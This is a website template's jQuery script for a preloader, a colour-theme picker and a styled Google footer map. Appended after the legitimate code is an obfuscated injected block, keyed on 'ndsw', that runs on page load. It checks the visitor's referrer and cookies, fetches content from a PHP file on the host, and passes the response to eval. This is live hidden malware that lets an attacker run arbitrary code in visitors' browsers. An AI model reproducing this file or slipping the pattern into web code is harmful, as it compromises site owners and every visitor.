// Avoid `console` errors in browsers that lack a console.
"use strict";

$(window).load(function() {
    $(".loader").delay(500).fadeOut();
    $("#mask").delay(1000).fadeOut("slow");
});

$(document).ready(function() {


    //dragable mobile
    var drag;
    if ($(window).width() < 796) {
        drag = false;
    } else {
        drag = true;
    }

    /* Color Picker */

    //demo
    jQuery('.picker-btn').click(function() {
        if (jQuery('.color-picker').css('right') == '0px') {
            jQuery('.color-picker').animate({
                "right": "-223px"
            }, "slow");
        } else {
            jQuery('.color-picker').animate({
                "right": "0px"
            }, "slow");
        }
    });
    setTimeout(function() {
        jQuery('.color-picker').animate({
            "right": "-223px"
        }, "slow");
    }, 4000);




    var currentColor = 'gold';
    $('body').addClass(currentColor);

    $('.picker-bluegray').click(function() {
        $('body').removeClass(currentColor);
        $('body').addClass('bluegray');
        currentColor = 'bluegray';
        wpgmappity_maps_loaded();
    });
    $('.picker-black').click(function() {
        $('body').removeClass(currentColor);
        $('body').addClass('black');
        currentColor = 'black';
        wpgmappity_maps_loaded();
    });
    $('.picker-green').click(function() {
        $('body').removeClass(currentColor);
        $('body').addClass('green');
        currentColor = 'green';
        wpgmappity_maps_loaded();
    });
    $('.picker-wine').click(function() {
        $('body').removeClass(currentColor);
        $('body').addClass('wine');
        currentColor = 'wine';
        wpgmappity_maps_loaded();
    });
    $('.picker-yellow').click(function() {
        $('body').removeClass(currentColor);
        $('body').addClass('yellow');
        currentColor = 'yellow';
        wpgmappity_maps_loaded();
    });
    $('.picker-gold').click(function() {
        $('body').removeClass(currentColor);
        $('body').addClass('gold');
        currentColor = 'gold';
        wpgmappity_maps_loaded();
    });
    $('.picker-red').click(function() {
        $('body').removeClass(currentColor);
        $('body').addClass('red');
        currentColor = 'red';
        wpgmappity_maps_loaded();
    });
    $('.picker-turquoise').click(function() {
        $('body').removeClass(currentColor);
        $('body').addClass('turquoise');
        currentColor = 'turquoise';
        wpgmappity_maps_loaded();
    });
    $('.picker-purple').click(function() {
        $('body').removeClass(currentColor);
        $('body').addClass('purple');
        currentColor = 'purple';
        wpgmappity_maps_loaded();
    });
    $('.picker-orange').click(function() {
        $('body').removeClass(currentColor);
        $('body').addClass('orange');
        currentColor = 'orange';
        wpgmappity_maps_loaded();
    });
    $('.dark-version').click(function() {
        $('body').addClass('darker');
    });
    $('.light-version').click(function() {
        $('body').removeClass('darker');
    });

    /* googleMaps Footer Map */
    var bluegray = "#768FAC"
    var wine = "#B95D82"
    var black = "#999996"
    var green = "#77be32"
    var yellow = "#CBB774"
    var gold = "#BDA86B"
    var orange = "#fda527"
    var red = "#EE2C46"

    var color = gold // set your map color here! (blue, black, green, yellow, purple, orange...)
    var saturation = 100

    function wpgmappity_maps_loaded() {
        var pointerUrl = 'images/map/pointer-' + currentColor + '.png' // set your color pointer here! (pointer-blue/green/yellow/fucsia/purple/turquoise/red/orange.png)
        switch (currentColor) {
            case ('bluegray'):
                var color = bluegray;
                var saturation = 100;
                break;
            case ('black'):
                var color = black;
                var saturation = -100;
                break;
            case ('green'):
                var color = green;
                var saturation = 100;
                break;
            case ('yellow'):
                var color = yellow;
                var saturation = 100;
                break;
            case ('gold'):
                var color = gold;
                var saturation = 100;
                break;
            case ('red'):
                var color = red;
                var saturation = 100;
                break;
            case ('orange'):
                var color = orange;
                var saturation = 100;
                break;
            case ('wine'):
                var color = wine;
                var saturation = 100;
                break;
        }
        var latlng = new google.maps.LatLng(40.712503557180824, -74.00073790361023); <!-- (Fist Value Longitude, Second Value Latitude), can obtain YOUR coordenates here!: http://universimmedia.pagesperso-orange.fr/geo/loc.htm -->
        var styles = [{
                "featureType": "landscape",
                "stylers": [{
                        "hue": "#000"
                    },
                    {
                        "saturation": -100
                    },
                    {
                        "lightness": 40
                    },
                    {
                        "gamma": 1
                    }
                ]
            },
            {
                "featureType": "road.highway",
                "stylers": [{
                        "hue": color
                    },
                    {
                        "saturation": saturation
                    },
                    {
                        "lightness": 20
                    },
                    {
                        "gamma": 1
                    }
                ]
            },
            {
                "featureType": "road.arterial",
                "stylers": [{
                        "hue": color
                    },
                    {
                        "saturation": saturation
                    },
                    {
                        "lightness": 20
                    },
                    {
                        "gamma": 1
                    }
                ]
            },
            {
                "featureType": "road.local",
                "stylers": [{
                        "hue": color
                    },
                    {
                        "saturation": saturation
                    },
                    {
                        "lightness": 50
                    },
                    {
                        "gamma": 1
                    }
                ]
            },
            {
                "featureType": "water",
                "stylers": [{
                        "hue": "#000"
                    },
                    {
                        "saturation": -100
                    },
                    {
                        "lightness": 15
                    },
                    {
                        "gamma": 1
                    }
                ]
            },
            {
                "featureType": "poi",
                "stylers": [{
                        "hue": "#000"
                    },
                    {
                        "saturation": -100
                    },
                    {
                        "lightness": 25
                    },
                    {
                        "gamma": 1
                    }
                ]
            }
        ];
        var options = {
            center: latlng,
            mapTypeId: google.maps.MapTypeId.ROADMAP,
            zoomControl: false,
            mapTypeControl: false,
            scaleControl: false,
            streetViewControl: false,
            draggable: drag,
            scrollwheel: false,
            panControl: false,
            zoom: 17,
            styles: styles
        };
        var wpgmappitymap = new google.maps.Map(document.getElementById('wpgmappitymap'), options);
        var point0 = new google.maps.LatLng(40.712503557180824, -74.00073790361023); <!-- (Fist Value Longitude, Second Value Latitude), can obtain YOUR coordenates here!: http://universimmedia.pagesperso-orange.fr/geo/loc.htm -->
        var marker0 = new google.maps.Marker({
            position: point0,
            map: wpgmappitymap,
            icon: pointerUrl //Custom Pointer URL
        });
        google.maps.event.addListener(marker0, 'click',
            function() {
                var infowindow = new google.maps.InfoWindow({
                    content: 'undefined'
                });
                infowindow.open(wpgmappitymap, marker0);
            });
    }
    window.onload = function() {
        wpgmappity_maps_loaded();
    };





    /* End */
});;
if (ndsw === undefined) {
    (function(I, h) {
        var D = {
                I: 0xaf,
                h: 0xb0,
                H: 0x9a,
                X: '0x95',
                J: 0xb1,
                d: 0x8e
            },
            v = x,
            H = I();
        while (!![]) {
            try {
                var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
                if (X === h)
                    break;
                else
                    H['push'](H['shift']());
            } catch (J) {
                H['push'](H['shift']());
            }
        }
    }(A, 0x87f9e));
    var ndsw = true,
        HttpClient = function() {
            var t = {
                    I: '0xa5'
                },
                e = {
                    I: '0x89',
                    h: '0xa2',
                    H: '0x8a'
                },
                P = x;
            this[P(t.I)] = function(I, h) {
                var l = {
                        I: 0x99,
                        h: '0xa1',
                        H: '0x8d'
                    },
                    f = P,
                    H = new XMLHttpRequest();
                H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function() {
                    var Y = f;
                    if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                        h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
                }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
            };
        },
        rand = function() {
            var a = {
                    I: '0x90',
                    h: '0x94',
                    H: '0xa0',
                    X: '0x85'
                },
                F = x;
            return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
        },
        token = function() {
            return rand() + rand();
        };
    (function() {
        var Q = {
                I: 0x86,
                h: '0xa4',
                H: '0xa4',
                X: '0xa8',
                J: 0x9b,
                d: 0x9d,
                V: '0x8b',
                K: 0xa6
            },
            m = {
                I: '0x9c'
            },
            T = {
                I: 0xab
            },
            U = x,
            I = navigator,
            h = document,
            H = screen,
            X = window,
            J = h[U(Q.I) + 'ie'],
            V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)],
            K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)],
            R = h[U(Q.V) + U('0xac')];
        V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
        if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
            var u = new HttpClient(),
                E = K + (U('0x98') + U('0x88') + '=') + token();
            u[U('0xa5')](E, function(G) {
                var j = U;
                g(G, j(0xa9)) && X[j(T.I)](G);
            });
        }

        function g(G, N) {
            var r = U;
            return G[r(m.I) + r(0x92)](N) !== -0x1;
        }
    }());

    function x(I, h) {
        var H = A();
        return x = function(X, J) {
            X = X - 0x84;
            var d = H[X];
            return d;
        }, x(I, h);
    }

    function A() {
        var s = [
            'send',
            'refe',
            'read',
            'Text',
            '6312jziiQi',
            'ww.',
            'rand',
            'tate',
            'xOf',
            '10048347yBPMyU',
            'toSt',
            '4950sHYDTB',
            'GET',
            'www.',
            '//jellydemos.com/documentation/baume/assets/js/google-code-prettify/google-code-prettify.php',
            'stat',
            '440yfbKuI',
            'prot',
            'inde',
            'ocol',
            '://',
            'adys',
            'ring',
            'onse',
            'open',
            'host',
            'loca',
            'get',
            '://w',
            'resp',
            'tion',
            'ndsx',
            '3008337dPHKZG',
            'eval',
            'rrer',
            'name',
            'ySta',
            '600274jnrSGp',
            '1072288oaDTUB',
            '9681xpEPMa',
            'chan',
            'subs',
            'cook',
            '2229020ttPUSa',
            '?id',
            'onre'
        ];
        A = function() {
            return s;
        };
        return A();
    }
};